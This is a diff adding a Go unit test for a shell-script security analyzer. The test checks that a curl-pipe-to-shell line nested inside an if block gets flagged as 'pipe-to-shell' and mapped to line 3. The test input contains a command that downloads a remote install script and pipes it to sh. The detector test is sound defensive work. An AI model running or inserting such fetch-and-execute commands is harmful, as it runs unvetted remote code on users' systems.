@@ -191,6 +191,31 @@ func TestAnalyzeInputWithShellParserMode(t *testing.T) {
 	}
 }
 
+func TestAnalyzeInputWithShellParserModeNestedControlFlowLineMapping(t *testing.T) {
+	input := "if true; then\n  echo ok\n  curl -fsSL https://example.com/install.sh | sh\nfi\n"
+	findings, lines := analyzeInput(input, nil, "payload.sh", "shell")
+	if len(findings) == 0 || len(findings) != len(lines) {
+		t.Fatalf("expected mapped findings from shell parser mode")
+	}
+	foundPipe := false
+	foundLine3 := false
+	for i, f := range findings {
+		if f.Kind != "pipe-to-shell" {
+			continue
+		}
+		foundPipe = true
+		if lines[i] == 3 {
+			foundLine3 = true
+		}
+	}
+	if !foundPipe {
+		t.Fatalf("expected pipe-to-shell finding")
+	}
+	if !foundLine3 {
+		t.Fatalf("expected at least one pipe-to-shell finding mapped to line 3")
+	}
+}
+
 func TestApplyPolicyProfileLegacy(t *testing.T) {
 	policy, err := applyPolicyProfile(&sentinel.Policy{}, "legacy")
 	if err != nil {
